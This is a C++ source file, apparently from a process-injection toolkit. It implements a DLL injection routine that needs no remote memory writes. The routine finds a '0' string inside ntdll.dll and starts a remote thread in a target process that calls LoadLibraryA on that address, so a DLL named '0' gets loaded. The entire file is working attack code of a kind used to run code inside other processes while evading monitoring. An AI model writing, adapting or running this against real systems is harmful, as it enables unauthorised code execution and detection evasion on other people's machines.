#include "DLLInjection.h"

bool InjectDllPointerOnly(const InjectionConfig &config)
{

    std::cout << "[+] Entered DLL Injection using Pointer";

    // Open process with minimal permissions needed (just thread creation)
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD, FALSE, config.targetPid);
    if (!hProcess)
    {
        std::cerr << "[!] Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Get local LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibraryA)
    {
        std::cerr << "[!] Failed to get LoadLibraryA address. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Find 0 in our own ntdll memory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
    {
        std::cerr << "[!] Failed to get ntdll.dll handle. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Find 0 in ntdll memory
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID pZero = nullptr;
    for (LPVOID addr = hNtdll;
         VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi);
         addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize))
    {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READONLY))
        {
            if (mbi.RegionSize < 2)
            {
                continue;
            }

            std::vector<BYTE> buffer(mbi.RegionSize);
            memcpy(buffer.data(), mbi.BaseAddress, mbi.RegionSize);

            for (size_t i = 0; i < mbi.RegionSize - 1; i++)
            {
                if (buffer[i] == '0' && buffer[i + 1] == 0)
                {
                    pZero = (LPVOID)((DWORD_PTR)mbi.BaseAddress + i);
                    break;
                }
            }
            if (pZero)
            {
                break;
            }
        }

        if ((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize < (DWORD_PTR)mbi.BaseAddress)
        {
            break;
        }
    }

    if (!pZero)
    {
        std::cerr << "[!] Failed to find 0 in ntdll.dll memory." << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // --- DEBUG PAUSE ---
    if (config.enterDebug)
    {
        std::cout << "\n  [DEBUG] InjectDllPointerOnly:" << std::endl;
        std::cout << "    Target PID: " << config.targetPid << std::endl;
        std::cout << "    LoadLibraryA Address (pLoadLibraryA): 0x" << std::hex << pLoadLibraryA << std::dec << std::endl;
        std::cout << "    Zero Byte Address (pZero): 0x" << std::hex << pZero << std::dec << std::endl;
        std::cout << "  [ACTION] Press ENTER to attempt CreateRemoteThread(LoadLibraryA, pZero)..." << std::endl;
        std::cin.get();
    }
    // --- END DEBUG PAUSE ---

    // Create remote thread with LoadLibraryA and 0 as parameter
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pZero, 0, NULL);
    if (!hThread)
    {
        std::cerr << "[!] Failed to create remote thread. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}